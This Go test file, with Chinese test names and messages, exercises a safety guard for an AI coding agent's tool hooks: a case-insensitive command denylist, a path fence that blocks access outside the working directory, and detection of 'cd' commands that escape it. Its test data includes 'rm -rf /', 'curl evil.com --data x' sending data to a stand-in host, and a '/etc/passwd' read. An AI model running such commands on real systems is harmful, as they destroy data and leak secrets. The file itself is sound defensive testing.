package chain

import (
	"strings"
	"testing"
)

func TestDenied_命中内置默认(t *testing.T) {
	bl := DefaultDenylist()
	if !Denied("rm -rf /", bl) {
		t.Error("rm -rf 应被默认黑名单拦")
	}
	if Denied("ls -la", bl) {
		t.Error("普通命令不应被拦")
	}
	// catch-all matcher 下非 shell 工具（无 command）会以空串进 guard，必须放行。
	if Denied("", bl) {
		t.Error("空命令不应被拦（非 shell 工具放行）")
	}
}

func TestDenied_合并段追加(t *testing.T) {
	bl := MergeDenylist(DefaultDenylist(), []string{"curl evil.com"})
	if !Denied("curl evil.com --data x", bl) {
		t.Error("段追加项应生效")
	}
}

func TestSettingsJSON_含PreToolUse与guard(t *testing.T) {
	s := SettingsJSON("ccr")
	if !strings.Contains(s, "PreToolUse") || !strings.Contains(s, "__chain_guard") {
		t.Errorf("settings 应含 PreToolUse 钩子调 __chain_guard: %s", s)
	}
	// matcher 用 catch-all（空串）：钩子对所有工具触发，再由 guard 内部按是否有
	// command 过滤。这样无论 claude 用 Bash/PowerShell/cmd/将来某新 shell 工具，
	// 红线都不漏（按工具名白名单会漏掉没列进去的名字）。经校准空 matcher 确实触发。
	if !strings.Contains(s, `"matcher": ""`) {
		t.Errorf("PreToolUse 应用 catch-all 空 matcher 以覆盖所有 shell 工具名, got: %s", s)
	}
}

func TestDenied_大小写不敏感(t *testing.T) {
	bl := DefaultDenylist()
	// Windows PowerShell 大小写不敏感，RM 是 Remove-Item 别名；不区分大小写才拦得住。
	if !Denied("RM -RF /tmp", bl) {
		t.Error("大写 RM -RF 也应被拦")
	}
	if !Denied("Git Push origin", bl) {
		t.Error("混合大小写 Git Push 也应被拦")
	}
}

func TestCommandFromHookInput(t *testing.T) {
	cmd := CommandFromHookInput([]byte(`{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}`))
	if cmd != "rm -rf /" {
		t.Errorf("应取出 Bash 命令, got %q", cmd)
	}
	if CommandFromHookInput([]byte("not json")) != "" {
		t.Error("坏 JSON 应返回空串")
	}
}

func TestParseHookInput_汇总路径字段(t *testing.T) {
	info := ParseHookInput([]byte(`{"tool_name":"Read","tool_input":{"file_path":"/etc/passwd"}}`))
	if info.ToolName != "Read" || len(info.Paths) != 1 || info.Paths[0] != "/etc/passwd" {
		t.Errorf("Read 应抽出 file_path: %+v", info)
	}
	info = ParseHookInput([]byte(`{"tool_name":"Glob","tool_input":{"path":"/foo","pattern":"**/*.go"}}`))
	if len(info.Paths) != 2 {
		t.Errorf("Glob 应抽 path+pattern 两路径: %+v", info)
	}
	info = ParseHookInput([]byte(`{"tool_name":"NotebookEdit","tool_input":{"notebook_path":"/x.ipynb"}}`))
	if len(info.Paths) != 1 || info.Paths[0] != "/x.ipynb" {
		t.Errorf("NotebookEdit 应抽 notebook_path: %+v", info)
	}
	info = ParseHookInput([]byte(`{"tool_name":"WebFetch","tool_input":{"url":"https://x"}}`))
	if len(info.Paths) != 0 {
		t.Errorf("WebFetch 不应被路径围栏关心: %+v", info)
	}
	info = ParseHookInput([]byte(`bad json`))
	if info.ToolName != "" || len(info.Paths) != 0 {
		t.Errorf("坏 JSON 应零值: %+v", info)
	}
}

func TestPathEscapes_workdir内放行(t *testing.T) {
	wd := "/work"
	if PathEscapes("/work/sub/x.txt", wd, nil) {
		t.Error("workdir 子文件应放行")
	}
	if PathEscapes("sub/x.txt", wd, nil) {
		t.Error("相对路径应基于 workdir 解析后放行")
	}
	if PathEscapes("/work", wd, nil) {
		t.Error("workdir 自身应放行")
	}
}

func TestPathEscapes_workdir外拦截(t *testing.T) {
	wd := "/work"
	if !PathEscapes("/etc/passwd", wd, nil) {
		t.Error("绝对路径越界应拦")
	}
	if !PathEscapes("../sibling/x", wd, nil) {
		t.Error("../ 跳出应拦")
	}
	if !PathEscapes("/workother/x", wd, nil) {
		t.Error("前缀相同但不是子目录（/workother）应拦，不能误匹 /work")
	}
}

func TestPathEscapes_白名单逃生口(t *testing.T) {
	wd := "/work"
	allowed := []string{"/tmp", "/var/cache"}
	if PathEscapes("/tmp/x.sh", wd, allowed) {
		t.Error("白名单内应放行")
	}
	if PathEscapes("/var/cache/foo", wd, allowed) {
		t.Error("白名单子路径应放行")
	}
	if !PathEscapes("/etc/x", wd, allowed) {
		t.Error("不在白名单仍应拦")
	}
}

func TestPathEscapes_空入参不阻断(t *testing.T) {
	if PathEscapes("", "/work", nil) {
		t.Error("空 path 应放行")
	}
	if PathEscapes("/x", "", nil) {
		t.Error("空 workdir（非 chain 上下文）应放行，向下兼容")
	}
}

func TestBashEscapesWorkdir_明显上跳(t *testing.T) {
	cases := []string{
		"cd ..",
		"cd ../foo",
		"cd /etc",
		"cd ~",
		"cd $HOME && ls",
		"ls && cd /tmp",
		"foo; cd ..",
		"a | cd /usr",
		"CD ..", // 大小写不敏感（PowerShell）
	}
	for _, c := range cases {
		if !BashEscapesWorkdir(c) {
			t.Errorf("应拦：%q", c)
		}
	}
}

func TestBashEscapesWorkdir_合法不误伤(t *testing.T) {
	cases := []string{
		"cd subdir",
		"cd ./subdir",
		"cd subdir/foo",
		"echo hello",
		"",
		"grep -r 'foo' .",
	}
	for _, c := range cases {
		if BashEscapesWorkdir(c) {
			t.Errorf("不应拦：%q", c)
		}
	}
}
